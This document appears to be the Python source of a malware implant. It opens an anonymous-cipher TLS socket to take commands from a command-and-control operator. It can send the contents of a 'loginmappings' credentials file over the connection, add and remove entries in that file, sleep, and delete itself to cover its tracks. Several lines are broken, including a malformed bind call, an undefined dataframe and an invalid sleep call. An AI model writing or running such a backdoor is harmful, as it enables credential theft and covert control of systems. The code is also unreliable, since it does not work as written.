from socket import * 
from csv import writer
import sys 
import csv 
import pandas as pd
import os 
import ssl 


#connect to command and control 
c2_ip = sys.argv[1]
c2_port = sys.argv[2]

implant_socket = socket(AF_INET, SOCK_STREAM)
wrapped_implant_socket = ssl.wrap_socket(implant_socket, ssl_version=ssl.PROTOCOL_TLS_SERVER, ciphers="ADH-AES256-SHA")
wrapped_implant_socket.bind(c2_ip, int(c2_port))
wrapped_implant_socket.listen()

while True: 
    connection_socket, client_address = wrapped_implant_socket.accept()
    command = connection_socket.recv(1024).split()
    if (command):
        connection_socket.send(f"COMMAND RECEIVED {command[0]}".encode())
    if (command[0] == "DESTRUCT"):
        os.remove(sys.argv[0])
        connection_socket.send("SUCCESSFULLY REMOVED")

    if (command[0] == "FETCHALL"):
        with open("./loginmappings", "rb") as file: 
            while True:
                bytes_read = file.read(1024)
                if not bytes_read:
                    break
                connection_socket.sendall(bytes_read)  
            file.close()

    if (command[0] == "ADDUSER"):
        with open("./loginmappings", "r") as file:
            last_user_ID = file.readlines()[-1][0]
        new_user = [last_user_ID + 1, command[2], command[3]]
        with open("./loginmappings", 'a') as file :
            write_obj = writer(file)
            write_obj.writerow(new_user)
            file.close()

    if (command[0] == "REMOVEUSER"):
        df = pd.read_csv("./loginmappings")
        df_s = df
        df_s = df_s.drop(df_s.query(f'USER_ID=={command[1]}').index)
        df_s.to_csv("loginmappings")

    if (command[0] == "GETUSER"):
        connection_socket(df.loc[df['USER_ID'] == 'yellow'].encode())
    
    if (command[0] == "SLEEP"):
        sys.argv[0].sleep(command[1])
